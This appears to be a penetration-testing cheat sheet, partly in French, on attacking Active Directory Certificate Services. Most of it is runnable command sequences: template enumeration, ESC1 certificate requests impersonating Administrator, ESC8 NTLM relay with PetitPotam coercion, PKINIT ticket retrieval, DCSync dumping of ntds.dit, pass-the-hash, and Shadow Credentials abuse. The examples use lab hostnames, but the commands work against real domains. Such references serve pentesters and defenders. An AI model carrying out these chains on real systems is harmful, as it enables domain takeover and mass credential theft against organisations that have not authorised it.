https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adcs-certificate-services/
# Énumération

**Sans credentials (réseau) :**
```bash
# ADCS expose des interfaces web par défaut
curl -k https://dc.domain.local/certsrv
nmap -p 443,80 --script http-title <dc_ip>
```

**Avec credentials (LDAP) :**
```bash
certipy find -u user@domain.local -p 'Password' -dc-ip 192.168.1.1
```

Certipy interroge LDAP et cherche des objets dans :

```
CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
```

Si un objet `pKIEnrollmentService` existe → ADCS est présent.

**NetExec**
```bash
netexec ldap domain.lab -u username -p password -M adcs
```

**ldapsearch**
```bash
ldapsearch -H ldap://dc_IP -x -LLL -D 'CN=<user>,OU=Users,DC=domain,DC=local' -w '<password>' -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local" dNSHostName
```

CobaltStrike
```
ldapsearch (|(objectClass=pKIEnrollmentService)(objectClass=pKICertificateTemplate)) --attributes *,ntsecuritydescriptor
```
# ESC1

1. Enumerate the certificate authority for vulnerable templates.
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
```

2. Request a certificate, specifying the default domain Administrator's _UserPrincipalName_ in the certificate's Subject Alternative Name (SAN).
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC1 --upn Administrator --quiet
```

3. Use Rubeus to request a TGT for Administrator.
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:[CERT] /enctype:aes256 /nowrap
```

# ESC8 - coercition vers domain admin

Pré-requis :

* ADCS actif sur le domaine avec le web enrollment activé.
* Une méthode de coerce fonctionnelle (ici on utilise petitpotam non authentifié, mais un printerbug authentifié ou une autre méthode de coerce fonctionnera pareil)
* Il existe un template utile pour exploiter ESC8, par défaut sur un Active Directory il s'appelle _DomainController_

Vérifions que le web enrollment est actif à l'adresse : http://192.168.56.23/certsrv/certfnsh.asp

Ajouter un listener pour relayer l'authentification SMB vers HTTP avec impacket ntlmrelayx

```bash
ntlmrelayx.py -t http://192.168.56.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

Lancer le coerce avec petitpotam non authentifié (cela ne fonctionnera plus sur un Active Directory à jour, mais les autres méthodes de coerce authentifiées fonctionneront pareil). ntlmrelayx va relayer l'authentification vers le web enrollment et récupérer le certificat

```bash
python PetitPotam.py <LOCAL_IP> <SRV_IP_TO_COERCE>
```

Demander un TGT avec le certificat que l'on vient d'obtenir

```bash
python gettgtpkinit.py -cert-pfx MACHINE\$.pfx domain.com/machine$ 'machine.ccache'
```

On a maintenant un TGT pour meereen, on peut donc lancer un DCsync et récupérer tout le contenu de ntds.dit.

```bash
export KRB5CCNAME=/home/pentester/Tools/PKINITtools/machine.ccache
nxc smb meereen.essos.local -k --use-kcache
nxc smb meereen.essos.local -k --use-kcache --ntds
secretsdump -k -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local
```

Se connecter avec pass-the-hash

```bash
nxc smb meereen.essos.local -u 'Administrateur' -H '4dcaa3baa4c8eddca29e2793490fc9b8'
```

# Shadow Credentials

![shadow_credentials](img/shadow_creds.png)

Le protocole d'authentification Kerberos fonctionne avec des tickets pour accorder l'accès. Un ST (Service Ticket) peut être obtenu en présentant un TGT (Ticket Granting Ticket). Ce TGT préalable ne peut être obtenu qu'en validant une première étape appelée « pré-authentification » (sauf si cette exigence est explicitement supprimée pour certains comptes, ce qui les rend vulnérables à l'[ASREProast](https://www.thehacker.recipes/ad/movement/kerberos/asreproast)). La pré-authentification peut être validée symétriquement (avec une clé DES, RC4, AES128 ou AES256) ou asymétriquement (avec des certificats). La méthode asymétrique de pré-authentification s'appelle PKINIT. Les objets utilisateur et ordinateur d'Active Directory possèdent un attribut nommé `msDS-KeyCredentialLink` où des clés publiques brutes peuvent être définies. Lors d'une tentative de pré-authentification via PKINIT, le KDC vérifie que l'utilisateur authentifiant possède la clé privée correspondante, et un TGT est envoyé en cas de correspondance. Il existe plusieurs scénarios où un attaquant peut contrôler un compte ayant la capacité de modifier l'attribut `msDS-KeyCredentialLink` (alias « kcl ») d'autres objets (ex. membre d'un [groupe spécial](https://www.thehacker.recipes/ad/movement/builtins/security-groups), possède des [ACE puissantes](https://www.thehacker.recipes/ad/movement/dacl/), etc.). Cela permet à un attaquant de créer une paire de clés, d'ajouter la clé publique brute dans l'attribut, et d'obtenir un accès persistant et furtif à l'objet cible (utilisateur ou ordinateur).

## Coerce method

```bash
ntlmrelayx.py -t ldaps://192.168.56.12 --remove-mic -smb2support --shadow-credentials
```

```bash
python3 PetitPotam.py -u khal.drogo -p horse 192.168.56.129 braavos.essos.local
```

```bash
python3 gettgtpkinit.py -cert-pfx l4HvSu19.pfx -pfx-pass 0IHQeDUwBbshb0o0BOSy essos.local/BRAAVOS$ l4HvSu19.ccache
```

```bash
export KRB5CCNAME=/home/pentester/Tools/PKINITtools/l4HvSu19.ccache
```

## ACL exploit method

```bash
pywhisker.py -d "FQDN_DOMAIN" -u "USER" -p "PASSWORD" --target "TARGET_SAMNAME" --action "list"
```

```bash
python3 gettgtpkinit.py -cert-pfx l4HvSu19.pfx -pfx-pass 0IHQeDUwBbshb0o0BOSy essos.local/BRAAVOS$ l4HvSu19.ccache
```

```bash
export KRB5CCNAME=/home/pentester/Tools/PKINITtools/l4HvSu19.ccache
```
